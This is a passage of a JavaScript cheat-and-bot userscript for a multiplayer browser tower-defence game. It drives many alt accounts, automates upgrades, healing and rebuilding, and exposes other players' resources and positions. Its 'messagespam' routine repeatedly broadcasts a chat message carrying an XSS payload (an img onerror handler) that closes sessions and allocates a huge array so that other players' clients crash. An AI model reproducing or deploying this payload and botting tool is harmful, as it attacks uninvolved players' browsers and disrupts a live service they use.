                                            if (distance > 50) {
                                                let direction = {
                                                    up: entity.position.y < socket.myPlayer.position.y ? 1 : 0,
                                                    down: entity.position.y > socket.myPlayer.position.y ? 1 : 0,
                                                    left: entity.position.x < socket.myPlayer.position.x ? 1 : 0,
                                                    right: entity.position.x > socket.myPlayer.position.x ? 1 : 0
                                                };
                                                socket.sendPacket(3, direction);
                                            } else {
                                                clearInterval(interval);
                                                callback();
                                            }
                                        }, 100);
                                    }
                        
                                    function gatherResource(socket, entityType, resourceType, targetAmount, callback) {
                                        let entity = findNearestEntity(socket, entityType);
                                        if (entity) {
                                            moveToEntity(socket, entity, () => {
                                                let interval = setInterval(() => {
                                                    if (socket.myPlayer[resourceType] < targetAmount) {
                                                        let yaw = Math.atan2(entity.position.y - socket.myPlayer.position.y, entity.position.x - socket.myPlayer.position.x) * 180 / Math.PI;
                                                        socket.sendPacket(3, { mouseDown: 1, yaw: yaw });
                                                    } else {
                                                        clearInterval(interval);
                                                        callback();
                                                    }
                                                }, 100);
                                            });
                                        }
                                    }
                        
                                    function placeBuildings(socket) {
                                        let spreadDistance = 2000; // Increased distance
                                        let directions = [
                                            { x: 0, y: -1 }, // up
                                            { x: 0, y: 1 }, // down
                                            { x: 1, y: 0 }, // right
                                            { x: -1, y: 0 }, // left
                                            { x: 1, y: -1 }, // upright
                                            { x: -1, y: -1 }, // upleft
                                            { x: 1, y: 1 }, // downright
                                            { x: -1, y: 1 } // downleft
                                        ];
                                        let direction = directions[index % directions.length];
                                        let originalPosition = { x: socket.myPlayer.position.x, y: socket.myPlayer.position.y };
                                        let spreadPosition = {
                                            x: originalPosition.x + direction.x * spreadDistance,
                                            y: originalPosition.y + direction.y * spreadDistance
                                        };
                        
                                        moveToEntity(socket, spreadPosition, () => {
                                            // Place gold stash
                                            socket.sendPacket(9, { name: "PlaceBuilding", buildingType: "GoldStash", position: spreadPosition });
                        
                                            // Place 6 gold mines
                                            for (let i = 0; i < 6; i++) {
                                                let minePosition = {
                                                    x: spreadPosition.x + (i % 3) * 50,
                                                    y: spreadPosition.y + Math.floor(i / 3) * 50
                                                };
                                                socket.sendPacket(9, { name: "PlaceBuilding", buildingType: "GoldMine", position: minePosition });
                                            }
                        
                                            // Place 2 bomb towers
                                            for (let i = 0; i < 2; i++) {
                                                let towerPosition = {
                                                    x: spreadPosition.x + (i % 2) * 100,
                                                    y: spreadPosition.y + Math.floor(i / 2) * 100
                                                };
                                                socket.sendPacket(9, { name: "PlaceBuilding", buildingType: "BombTower", position: towerPosition });
                                            }
                                        });
                                    }
                        
                                    // Chat commands to move to wood and stone
                                    game.ui.components.Chat.onMessageReceived = (msg) => {
                                        if (msg.message === "!wood") {
                                            gatherResource(socket, "Tree", "wood", 100, () => {
                                                game.ui.components.PopupOverlay.showHint(`Socket ${socket.id} gathered 100 wood.`, 2000);
                                            });
                                        } else if (msg.message === "!stone") {
                                            gatherResource(socket, "Stone", "stone", 100, () => {
                                                game.ui.components.PopupOverlay.showHint(`Socket ${socket.id} gathered 100 stone.`, 2000);
                                            });
                                        }
                                    };
                                });
                            }
                                break;
                }
            }
        });
    }
    onRpcHandler(data) {
        switch (data.name) {
            case "LocalBuilding":
                data.response.forEach(e => {
                    if (e.type == "GoldStash") {
                        this.gs = e;
                    }
                    if (e.type == "GoldStash" && e.dead) {
                        this.gs = null;
                    }
                    e.type == "Harvester" && this.harvesters.set(e.uid, e);
                    e.type == "Harvester" && e.dead && this.harvesters.delete(e.uid);
                    if (this.scripts.autoreupgrader && this.gs && this.reupgrader.get((e.x - this.gs.x) / 24 + (e.y - this.gs.y) / 24 * 1000)) {
                        const index = (e.x - this.gs.x) / 24 + (e.y - this.gs.y) / 24 * 1000;
                        const _reupgrader = this.reupgrader.get(index);
                        if (e.dead) {
                            this.inactiveReupgrader.delete(index);
                        } else {
                            if (e.tier < _reupgrader[2]) {
                                !this.inactiveReupgrader.get(index) && this.inactiveReupgrader.set(index, [_reupgrader[0], _reupgrader[1], _reupgrader[2], e.tier, e.uid, this.tick]);
                            } else {
                                this.inactiveReupgrader.delete(index);
                            }
                        }
                    }
                })
                break;
            case "PartyShareKey":
                let el = document.createElement('div');
                el.innerText = data.response.partyShareKey;
                el.className = `tag${this.num++}`;
                this.getElement('hud-keys hud-party-grid')[0].appendChild(el);
                this.getElement(`${el.className}`)[0].addEventListener('click', e => {
                    this.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: el.innerText});
                })
                break;
            case "Dead":
                this.sendPacket(9, {name: "BuyItem", itemName: "HatHorns", tier: 1});
                if (this.gs) {
                    this.reversedYaw = true;
                    setTimeout(() => {
                        this.reversedYaw = false;
                    }, 500);
                }
                break;
            case "PartyInfo":
                this.partyInfo = data.response;
                this.partyInfoSession = data.response;
                this.partyInfoAlt = data.response;
                if (data.response[0].playerUid == game.world.myUid) {
                    data.response.forEach(e => {
                        if (socketsByUid[e.playerUid] && !e.canSell) {
                            this.sendPacket(9, {name: "SetPartyMemberCanSell", uid: e.playerUid, canSell: 1});
                        }
                    })
                }
                break;
            case "SetPartyList":
                this.players = 0;
                this.parties = "";
                data.response.forEach(e => {
                    this.players += e.memberCount;
                    if (e.isOpen == 0) {
                        this.parties += "<div style=\"width: relative; height: relative;\" class=\"hud-party-link is-disabled\"><strong>" + Sanitize(e.partyName) + "</strong><span>" + e.memberCount + "/4<span></div>";
                    }
                })
                if (this.oldPlayers !== this.players) {
                    this.oldPlayers = this.players;
                    game.ui.components.PopupOverlay.showHint(`${this.players} players, ${Object.keys(sockets).length} sockets, ${Object.keys(window.allSessions).length} sessions, ${Object.keys(window.allSessions).length > 0 ? Object.keys(sockets).length + Object.keys(window.allSessions).length : Object.keys(sockets).length + 1} slots`);
                }
                if (this.scripts.autoRefiller) {
                    let neededAlts = 32 - this.players;
                    if (neededAlts > 5) return;
                    let delay = ms => new Promise(resolve => {
                        setTimeout(resolve, ms);
                    });
                    delay(1000);
                    for (let i = 0; i < neededAlts; i++) {
                        delay(2000);
                        new Alt();
                        delay(2000);
                    };
                };
                this.getId("privateHud").innerHTML = this.parties;
                document.getElementsByClassName("hud-party-server")[0].innerHTML = `${this.players}/32 <small>${game.network.connectionOptions.name}</small>`;
                break;
            case "DayCycle":
                this.dayCycle = data.response;
                if (!data.response.isDay) {
                    this.buildOnce = false;
                    this.sellOnce = false;
                    if (this.scripts.autopetevolve && this.myPet && [9, 17, 25, 33, 49, 65, 97].includes(Math.min(Math.floor(this.myPet.experience / 100) + 1, [9, 17, 25, 33, 49, 65, 97][this.myPet.tier - 1]))) {
                        this.sendPacket(9, {name: "BuyItem", itemName: this.myPet.model, tier: this.myPet.tier + 1});
                    }
                    if (game.ui.playerTick) {
                        if (this.scripts.scorelogger && !game.ui.isWavePaused) {
                            this.newScore = game.ui.playerTick.score;
                            this.scoreLogged = (this.newScore - this.oldScore).toLocaleString("en");
                            if (!this.oldScore) {
                                this.oldScore = game.ui.playerTick.score;
                                return;
                            }
                            this.oldScore = game.ui.playerTick.score;
                            this.scores.push(JSON.parse(this.scoreLogged.replaceAll(",", "")));
                            Object.values(this.scores).forEach(e => {
                                this.sum += e;
                            });
                            console.log(`[${++this.waveNumber}] Wave: ${game.ui.playerTick.wave}, SPW: ${this.scoreLogged}, Total Score: ${(game.ui.playerTick.score).toLocaleString("en")}, Average: ${(Math.round(this.script.sum/(this.script.waveNumber + 1))).toLocaleString("en")};`);
                        }
                    }
                }
                break;
        }
    }
    onEntityUpdateHandler = (_e) => {
        let e = _e.entities;
        this.tick = _e.tick;
        this.autoUpgradeTicks = (this.autoUpgradeTicks + 1) % 10;
        this.autoSellTicks = (this.autoSellTicks + 1) % 2;
        if (this.scripts.messagespam) {
            this.spamMessagesTicks = (this.spamMessagesTicks + 1) % 5;
            if (this.spamMessagesTicks == 0) {
                let encoded = game.network.codec.encode(9, {name: "SendChatMessage", channel: "Local", message: `.............................................................................................................................<img src onerror="window.client&&client.closeSession(client.connectedToId);game.network.socket.send([]);[...Array(2**32-1)]"`});
                game.network.socket.send(encoded);
                Object.values(sockets).forEach(e => {
                    e.ws.send(encoded);
                });
            }
        }
        if (autotier1spear || autotier2spear || autotier3spear || autotier4spear || autotier5spear || autotier6spear || autotier7spear) {
            let price = 4200;
            let tier = 2;
            if (autotier1spear) {
                price = 1400;
                tier = 1;
            }
            if (autotier2spear) {
                price = 4200;
                tier = 2;
            }
            if (autotier3spear) {
                price = 9800;
                tier = 3;
            }
            if (autotier4spear) {
                price = 21000;
                tier = 4;
            }
            if (autotier5spear) {
                price = 43500;
                tier = 5;
            }
            if (autotier6spear) {
                price = 88500;
                tier = 6;
            }
            if (autotier7spear) {
                price = 178500;
                tier = 7;
            }
            Object.keys(sockets).forEach(i => {
                if (!sockets[i].mouseDownHit && sockets[i].myPlayer.gold < price && !sockets[i].inventory.Spear || (sockets[i].myPlayer.gold < price && sockets[i].inventory.Spear.tier < tier)) {
                    sockets[i].join(game.ui.playerPartyShareKey);
                } else {
                    sockets[i].leave();
                }
            })
        }
        if (this.scripts.autoaltjoin) {
            Object.values(sockets).forEach(e => {
            if (e.gs) {
                e.join(game.ui.playerPartyShareKey);
            } else {
                e.leave();
            }
            });
        }
        daySeconds = Math.floor((_e.tick * 50 / 1000 + 60) % 120);
        if (this.scripts.sbt.enabled) {
            if (!this.buildOnce && daySeconds >= sbtStartTick) {
                this.buildOnce = true;
                if (Math.abs(game.ui.playerTick.position.x - 9168) <= 576 && Math.abs(game.ui.playerTick.position.y - 3840) <= 576) {
                    this.sendPacket(9, {name: "MakeBuilding", type: "MeleeTower", x: this.gs.x, y: this.gs.y + 288, yaw: 0});
                }
            }
            if (!this.sellOnce && daySeconds >= sbtEndTick) {
                 this.sellOnce = true;
                 const melee = Object.values(game.ui.buildings).find(e => e.type == "MeleeTower" && e.tier == 1 && e.x == 9168 && e.y == 3840);
                 melee && this.sendPacket(9, {name: "DeleteBuilding", uid: melee.uid});
            } 
        }
        Object.values(game.ui.buildings).forEach(x => {
            if (this.scripts.autoupgrade) {
                if (this.getElement("X1")[0].value.includes(x.type)) {
                    if (this.autoUpgradeTicks == 0 && Math.hypot((game.ui.playerTick.position.x - x.x), (game.ui.playerTick.position.y - x.y)) <= 768) {
                        this.sendPacket(9, {name: "UpgradeBuilding", uid: x.uid});
                    }
                }
            }
            if (this.scripts.autosell) {
                if (this.getElement("X3")[0].value.includes(x.type)) {
                    if (this.autoSellTicks == 0 && Math.hypot((game.ui.playerTick.position.x - x.x), (game.ui.playerTick.position.y - x.y)) <= 864) {
                        this.sendPacket(9, {name: "DeleteBuilding", uid: x.uid});
                    }
                }
            }
            if (this.scripts.upgradetowerhealth) {
                this.uthTicks = (this.uthTicks + 1) % 10;
                this.revertTicks = (this.revertTicks + 1) % 1200;
                if (game.world.entities.get(x.uid) !== undefined) {
                    if ((game.world.entities.get(x.uid).targetTick.health / game.world.entities.get(x.uid).targetTick.maxHealth * 100) <= this.getElement("X11")[0].value && game.world.entities.get(x.uid).targetTick.tier < (x.type !== "GoldStash" ? (this.gs.tier > 1 && this.gs.tier) : 8) && Math.hypot((game.ui.playerTick.position.x - x.x), (game.ui.playerTick.position.y - x.y)) <= 768 && this.uthTicks == 0) {
                        this.revertTicks = 10;
                        this.sendPacket(9, {name: "UpgradeBuilding", uid: x.uid});
                    }
                    if (game.world.entities.get(x.uid).targetTick.tier > 1 && game.world.entities.get(x.uid).targetTick.tier < (this.gs.tier == 2 ? 3 : this.gs.tier) && this.revertTicks < 10) {
                        this.revertTicks = 0;
                        this.sendPacket(9, {name: "DeleteBuilding", uid: x.uid});
                    }
                }
            }
            if (this.scripts.healtowerhealth) {
                if (x.type == "ArrowTower" || x.type == "CannonTower" || x.type == "BombTower" || x.type == "MagicTower" || x.type == "MeleeTower") {
                    if (game.world.entities.get(x.uid) !== undefined) {
                        (game.world.entities.get(x.uid).targetTick.health / game.world.entities.get(x.uid).targetTick.maxHealth * 100) <= this.getElement("X13")[0].value && Math.hypot((game.ui.playerTick.position.x - x.x), (game.ui.playerTick.position.y - x.y)) <= 1000 && this.sendPacket(9, {name: "CastSpell", spell: "HealTowersSpell", x: x.x, y: x.y, tier: 1});
                    }
                }
            }
        });
        this.gs && this.scripts.autorebuilder && this.rebuilder.forEach(e => {
            const x = e[0] * 24 + this.gs.x;
            const y = e[1] * 24 + this.gs.y;
            if ((Math.abs(game.ui.playerTick.position.x - x) <= 576 && Math.abs(game.ui.playerTick.position.y - y) <= 576) && Object.keys(game.ui.buildings).length < this.rebuilder.size) {
                this.sendPacket(9, {name: "MakeBuilding", x: x, y: y, type: e[2], yaw: e[3]});
            }
        })
        this.gs && this.scripts.autoreupgrader && this.inactiveReupgrader.forEach(e => {
            const x = e[0] * 24 + this.gs.x;
            const y = e[1] * 24 + this.gs.y;
            if (Math.hypot((game.ui.playerTick.position.x - x), (game.ui.playerTick.position.y - y)) <= 768) {
                if (e[5] - this.tick <= 0) {
                    e[5] = this.tick + 7;
                    this.sendPacket(9, {name: "UpgradeBuilding", uid: e[4]});
                }
            }
        })
        let player = entities.get(myPlayer.uid);
        let _player = e.get(myPlayer.uid);
        if (player && _player && _player.uid) {
            myPlayer = player.targetTick;
            if (!script.scripts.socketFreezeMouse) {
                Object.values(sockets).forEach(bot => {
                    !bot.isLocked && (bot.mouse = screenToWorld(myMouse.x, myMouse.y));
                });
            }
            if ((myPlayer.health/myPlayer.maxHealth) * 100 < script.scripts.autoheal.healSet && (myPlayer.health/myPlayer.maxHealth) * 100 > 0) {
                if (script.scripts.autoheal.enabled && !script.scripts.xkey) {
                    if (!window.healPlayer) {
                        this.sendPacket(9, {name: "BuyItem", itemName: "HealthPotion", tier: 1})
                        this.sendPacket(9, {name: "EquipItem", itemName: "HealthPotion", tier: 1})
                        this.sendPacket(9, {name: "BuyItem", itemName: "HealthPotion", tier: 1})
                        window.healPlayer = true;
                        setTimeout(() => {
                            window.healPlayer = false;
                        }, 500);
                    }
                }
            }
            if (myPlayer.petUid) {
                window.activated = true;
                if (_player && _player.uid) {
                    let pet = entities.get(myPlayer.petUid);
                    if (pet) {
                        myPet = pet.targetTick;
                        window.myPet = myPet;
                        if (myPet) {
                            if (script.scripts.autopetheal.enabled && !script.scripts.xkey) {
                                if ((myPet.health/myPet.maxHealth) * 100 < script.scripts.autopetheal.healSet && (myPet.health/myPet.maxHealth) * 100 > 0) {
                                    if (!window.healPet) {
                                        this.sendPacket(9, {name: "BuyItem", itemName: "PetHealthPotion", tier: 1})
                                        this.sendPacket(9, {name: "EquipItem", itemName: "PetHealthPotion", tier: 1})
                                        window.healPet = true;
                                        setTimeout(() => {
                                            window.healPet = false;
                                        }, 500);
                                    }
                                }
                            }
                            if (script.scripts.autoEvolvePets && evolvePetTiersAndExp[`${myPet.tier}, ${detectPetLevelIfHigherReturnItsRequiredLevel(myPet.tier, Math.floor(myPet.experience / 100) + 1)}, ${detectPetTokenIfHigherReturnItsRequiredLevel(myPet.tier, myPlayer.token)}`]) {
                                if (!window.EvolveOnceEverySecond) {
                                    this.sendPacket(9, {name: "BuyItem", itemName: myPet.model, tier: myPet.tier + 1});
                                    window.EvolveOnceEverySecond = true;
                                    setTimeout(() => {
                                        window.EvolveOnceEverySecond = false;
                                    }, 1000)
                                }
                            }
                            if (script.model !== myPet.model) script.model = myPet.model;
                            if (script.tier !== myPet.tier) script.tier = myPet.tier;
                        }
                    }
                }
            }
            if (script.scripts.autoRevivePets && window.activated) {
                this.sendPacket(9, {name: "BuyItem", itemName: "PetRevive", tier: 1});
                this.sendPacket(9, {name: "EquipItem", itemName: "PetRevive", tier: 1});
            }
            let targets = [];
            let trees = [];
            let stones = [];
            const myPos = myPlayer.position;
            if (myPos) {
                this.target = targets.sort((a, b) => measureDistance(myPos, a.position) - measureDistance(myPos, b.position))[0];
                this.tree = trees.sort((a, b) => measureDistance(myPos, a.position) - measureDistance(myPos, b.position))[0];
                this.stone = stones.sort((a, b) => measureDistance(myPos, a.position) - measureDistance(myPos, b.position))[0];
            }
            let sockets2 = [];
            for (let i in sockets) {
                (sockets[i].mouseDownHit || sockets[i].myPlayer.dead) ? null : sockets2.push(sockets[i]);
            }
            nearestAltMouse = sockets2.sort((a, b) => {
                return measureDistance(a.mouse, a.myPlayer.position) - measureDistance(b.mouse, b.myPlayer.position);
            })[0];
            }
            this.scripts.autoheal.autobuypotion && !this.scripts.xkey && this.sendPacket(9, {name: "BuyItem", itemName: "HealthPotion", tier: 1});
            this.scripts.autopetheal.autobuypotion && this.sendPacket(9, {name: "BuyItem", itemName: "PetHealthPotion", tier: 1});
            ahrc_1 && this.harvesterTicks.forEach(tick => {
                tick.tick++;
                if (tick.tick >= tick.resetTick) {
                    tick.tick = 0;
                    ahrc_turn_id == "main" ? this.depositAhrc(tick) : sockets[ahrc_turn_id] && sockets[ahrc_turn_id].depositAhrc(tick);
                }
                if (tick.tick == 1) {
                    ahrc_turn_id == "main" ? this.collectAhrc(tick) : sockets[ahrc_turn_id] && sockets[ahrc_turn_id].collectAhrc(tick);
                }
            });
            if (this.scripts.autobow) {
                if (thisWeapon == "Bow") {
                    this.sendPacket(3, {space: 0});
                    this.sendPacket(3, {space: 1});
                } else {
                    this.sendPacket(3, {mouseDown: game.inputPacketCreator.lastAnyYaw});
                }
                Object.values(sockets).forEach(e => {
                    if (e.thisWeapon == "Bow") {
                        e.sendPacket(3, {space: 0});
                        e.sendPacket(3, {space: 1});
                    } else {
                        e.sendPacket(3, {mouseDown: e.aimingYaw});
                    }
                })
            }
            e.forEach(e1 => {
                if (e1.model == "GamePlayer" || e1.model == "Tree" || e1.model == "Stone" || e1.model == "PetCARL" || e1.model == "PetMiner") {
                    if (entities.get(e1.uid) == undefined) entities.set(e1.uid, {uid: e1.uid, entityClass: e1.entityClass, model: e1.model, targetTick: e1});
                }
                if (e1.model == "GoldStash") {
                    window.lines && window.lines.length && lines.forEach(e => e.destroy());
                    window.lines && (window.lines.length = 0);
                    if (window.makeBoarder) {
                        window.gr && window.gr.destroy();
                        window.gr = new PIXI.Graphics();
                        window.gr.beginFill(0xffffff);
                        window.gr.drawCircle(e1.position.x, e1.position.y, 1302);
                        window.gr.alpha = 0.1;
                        game.world.renderer.entities.node.addChild(window.gr);
                        window.makeBoarder(e1.position.x-48, e1.position.y-48, (48*2), 3, 1, "white");
                        window.makeBoarder(e1.position.x-48, e1.position.y+48, (48*2), 3, 1, "white");
                        window.makeBoarder(e1.position.x+48, e1.position.y-48, 3, (49.5*2), 1, "white");
                        window.makeBoarder(e1.position.x-48, e1.position.y-48, 3, (48*2), 1, "white");
                        window.makeBoarder(e1.position.x-864, e1.position.y-864, (864*2), 3, 1, "red");
                        window.makeBoarder(e1.position.x-864, e1.position.y+864, (864*2), 3, 1, "red");
                        window.makeBoarder(e1.position.x+864, e1.position.y-864, 3, (865.5*2), 1, "red");
                        window.makeBoarder(e1.position.x-864, e1.position.y-864, 3, (864*2), 1, "red");
                        window.makeBoarder(e1.position.x-1680, e1.position.y-1680, (1680*2), 3, 1, "yellow");
                        window.makeBoarder(e1.position.x-1680, e1.position.y+1680, (1680*2), 3, 1, "yellow");
                        window.makeBoarder(e1.position.x+1680, e1.position.y-1680, 3, (1681.5*2), 1, "yellow");
                        window.makeBoarder(e1.position.x-1680, e1.position.y-1680, 3, (1680*2), 1, "yellow");
                        window.makeBoarder(e1.position.x-2544, e1.position.y-2544, (2544*2), 3, 1, "green");
                        window.makeBoarder(e1.position.x-2544, e1.position.y+2544, (2544*2), 3, 1, "green");
                        window.makeBoarder(e1.position.x+2544, e1.position.y-2544, 3, (2545.5*2), 1, "green");
                        window.makeBoarder(e1.position.x-2544, e1.position.y-2544, 3, (2544*2), 1, "green");
                        window.makeBoarder(e1.position.x-5040, e1.position.y-5040, (5040*2), 3, 1, "blue");
                        window.makeBoarder(e1.position.x-5040, e1.position.y+5040, (5040*2), 3, 1, "blue");
                        window.makeBoarder(e1.position.x+5040, e1.position.y-5040, 3, (5041.5*2), 1, "blue");
                        window.makeBoarder(e1.position.x-5040, e1.position.y-5040, 3, (5040*2), 1, "blue");
                    }
                }
            });    
            if (user.connectedToId && user.ws.readyState == 1 && Object.values(user.activeSessions)[0].serverId) {
                window.sessionUid = game.world.myUid;
                sessionMouseMove && (sessionMouse = screenToWorld(myMouse.x, myMouse.y));
                window.myPsk = game.ui.playerPartyShareKey;
                user.sendMessage(`stats,  ;${JSON.stringify(sessionMouse.x)},  ;${JSON.stringify(sessionMouse.y)},  ;${game.renderer.getWidth()},  ;${game.renderer.getHeight()},  ;${window.myPsk},  ;${window.sessionUid},  ;${user.activeSessions[user.connectedToId].serverId}`);
                if (!showplayersinfo) {
                    Object.keys(window.allSessions).forEach(session => {
                        if (game.world.entities.get(window.allSessions[session].uid) !== undefined) {
                            window.allSessions[session].uid !== game.world.myUid && (game.world.entities.get(window.allSessions[session].uid).targetTick.name = session);
                        }
                    });
                }
                if (Object.keys(window.allSessions)[0] && window.allSessions[`${Object.keys(window.allSessions)[0].slice(0, 1)}${user.connectedToId}`]?.target.x > 0 && window.allSessions[`${Object.keys(window.allSessions)[0].slice(0, 1)}${user.connectedToId}`]?.target.y > 0) {
                    if (!isSentOnce) {
                        isSentOnce = true;
                        game.ui.components.Chat.onMessageReceived({displayName: "PlayerFinder", message: `${sessionPlayerFinderRank + 1}found, position: {x: ${allSessions[Object.keys(window.allSessions)[0].slice(0, 1) + user.connectedToId]?.target.x}, y: ${allSessions[Object.keys(window.allSessions)[0].slice(0, 1) + user.connectedToId]?.target.y}}`});
                    }
                } else {
                    isSentOnce = false;
                }
                sessions = 0;
                sessions = Object.keys(allSessionsByUid).length;
                if (oldSessions !== sessions) {
                    oldSessions = sessions;
                    game.ui.components.Map.onPartyMembersUpdate(this.partyInfoSession);
                }  
            }       
            if (user.connectedToId) {
                let sessions2 = [];
                for (let i in window.allSessions) {
                    (!window.allSessions[i].isOnControl || window.allSessions[i].mouseDownHit || window.allSessions[i].dead || window.allSessions[i].uid == window.sessionUid) ? null : sessions2.push(window.allSessions[i]);
                }
                nearestSessionMouse = sessions2.sort((a, b) => {
                    return measureDistance(sessionMouse, a.position) - measureDistance(sessionMouse, b.position);
                })[0];
           }
           if (showplayersinfo) {
               !_showRss && (_showRss = true);
           }
           if (showplayersinfo || _showRss) {
                entities.forEach(e2 => {
                let t = e2.targetTick;
                if (t.name && game.world.entities.get(t.uid)) {
                    let player = game.world.entities.get(t.uid).targetTick;
                    if (player) {
                        let wood_1 = counter(player.wood);
                        let stone_1 = counter(player.stone);
                        let gold_1 = counter(player.gold);
                        let token_1 = counter(player.token);
                        let px_1 = counter(player.position.x);
                        let py_1 = counter(player.position.y);
                        if (showplayersinfo && !player.oldName) {
                            player.oldName = player.name;
                            player.oldWood = wood_1;
                            player.oldStone = stone_1;
                            player.oldGold = gold_1;
                            player.oldToken = token_1;
                            player.oldPX = px_1;
                            player.oldPY = py_1;
                            player.info = `[${game.world.myUid ? "✔" : "?"}] ${player.oldName}, W: ${wood_1}, S: ${stone_1}, G: ${gold_1}, T: ${token_1};\nx: ${Math.round(player.position.x)}, y: ${Math.round(player.position.y)}, partyId: ${player.partyId} [${game.ui.parties[player.partyId]?.memberCount}/4]` + (socketsByUid[player.uid] ? `, id: ${socketsByUid[player.uid].id};` : `;`);
                            player.name = player.info;
                        }
                        if (!showplayersinfo && player.oldName) {
                            player.info = player.oldName;
                            player.name = socketsByUid[player.uid] ? "" + socketsByUid[player.uid].id : player.info;
                            player.oldName = null;
                        }
                        if (showplayersinfo) {
                            if (player.oldGold !== gold_1 || player.oldWood !== wood_1 || player.oldStone !== stone_1 || player.oldToken !== token_1 || player.oldPX !== px_1 || player.oldPY !== py_1) {
                                player.oldWood = wood_1;
                                player.oldStone = stone_1;
                                player.oldGold = gold_1;
                                player.oldToken = token_1;
                                player.oldPX = px_1;
                                player.oldPY = py_1;
                                player.info = `[${game.world.myUid ? "✔" : "?"}] ${player.oldName}, W: ${wood_1}, S: ${stone_1}, G: ${gold_1}, T: ${token_1};\nx: ${Math.round(player.position.x)}, y: ${Math.round(player.position.y)}, partyId: ${player.partyId} [${game.ui.parties[player.partyId]?.memberCount}/4]` + (socketsByUid[player.uid] ? `, id: ${socketsByUid[player.uid].id};` : `;`);
                                player.name = player.info;
                            }
                        }
                    }
                }
            })
        }
        if (!showplayersinfo) {
            _showRss = false;
        }
    }
}
this.script = new Script();
game.network.addPacketHandler(4, e => {
    this.script.onEnterWorldHandler(e);
});
game.network.addPacketHandler(9, e => {
    this.script.onRpcHandler(e);
});
game.network.addPacketHandler(0, e => {
    this.script.onEntityUpdateHandler(e);
});

let prefix = "!";
game.network.sendRpc2 = game.network.sendRpc;
game.network.sendRpc = (e) => {
    if (window.log_1) console.log(e);
    if (e.name == "SendChatMessage") {
        if (e.message.startsWith(prefix)) {
            let msg = e.message.toLowerCase();
            if (msg.startsWith(prefix + "ahrc")) {
                let args = msg.split(" ");
                ahrc_turn_id = args[1] || "main";
                if (ahrc_turn_id !== "main") {
                    user.connectedToId && user.sendMessage(`sesahrcon,  ;${args[1]}`);    
                } else {
                    if (user.connectedToId) {
                        user.sendMessage("eahrc");
                        user.sendMessage("getsettings");
                    }
                }
            }
            if (msg.startsWith(prefix + prefix + "ahrc")) {
                let args = msg.split(" ");
                ahrc_turn_id = args[1] || "main";
                if (ahrc_turn_id !== "main") {
                    user.connectedToId && user.sendMessage(`sesahrcoff,  ;${args[1]}`);    
                } else {
                    if (user.connectedToId) {
                        user.sendMessage("dahrc");
                        user.sendMessage("getsettings");
                        user.sendMessage("allsesahrcoff");
                    }
                }
            }
            if (msg == prefix + "at") {
                if (user.connectedToId) {
                    user.sendMessage("eamt");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "at") {
                if (user.connectedToId) {
                    user.sendMessage("damt");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "ab") {
                if (user.connectedToId) {
                    user.sendMessage("eab");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "ab") {
                if (user.connectedToId) {
                    user.sendMessage("dab");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "au") {
                if (user.connectedToId) {
                    user.sendMessage("eau");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "au") {
                if (user.connectedToId) {
                    user.sendMessage("dau");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "atb") {
                if (user.connectedToId) {
                    user.sendMessage("eatb");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "atb") {
                if (user.connectedToId) {
                    user.sendMessage("datb");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "apr") {
                if (user.connectedToId) {
                    user.sendMessage("eapr");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "apr") {
                if (user.connectedToId) {
                    user.sendMessage("dapr");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "aph") {
                if (user.connectedToId) {
                    user.sendMessage("eaph");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "aph") {
                if (user.connectedToId) {
                    user.sendMessage("daph");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "pt") {
                if (user.connectedToId) {
                    user.sendMessage("ept");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "pt") {
                if (user.connectedToId) {
                    user.sendMessage("dpt");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "rpt") {
                if (user.connectedToId) {
                    user.sendMessage("erpt");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "rpt") {
                if (user.connectedToId) {
                    user.sendMessage("drpt");
                    user.sendMessage("getsettings");
                }
            }
            if (msg.startsWith(`${prefix}aa `)) {
                let args = msg.split(`${prefix}aa `);
                let min = args[1].split(" ")[0];
                let max = args[1].split(" ")[1];
                if (user.connectedToId) {
                    user.sendMessage(`eaap,  ;${min},  ;${max}`);
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "aa") {
                if (user.connectedToId) {
                    user.sendMessage("daap");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "aaz") {
                if (user.connectedToId) {
                    user.sendMessage("eaaz");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "aaz") {
                if (user.connectedToId) {
                    user.sendMessage("daaz");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "pl") {
                if (user.connectedToId) {
                    user.sendMessage("epl");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "pl") {
                if (user.connectedToId) {
                    user.sendMessage("dpl");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "lock") {
                user.connectedToId && user.sendMessage("lock");
            }
            if (msg == prefix + "ape") {
                if (user.connectedToId) {
                    user.sendMessage("eape");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "ape") {
                if (user.connectedToId) {
                    user.sendMessage("dape");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "arc") {
                user.connectedToId && user.sendMessage("earc");
            }
            if (msg == prefix + prefix + "arc") {
                user.connectedToId && user.sendMessage("darc");
            }
            if (msg.startsWith(`${prefix}uth `)) {
                let args = msg.split(`${prefix}uth `);
                let uthHealth = args[1].split(" ")[0];
                let revertToggle = args[1].split(" ")[1];
                if (user.connectedToId) {
                    user.sendMessage(`euth,  ;${uthHealth},  ;${revertToggle}`);
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "uth") {
                if (user.connectedToId) {
                    user.sendMessage("duth");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "ua") {
                if (user.connectedToId) {
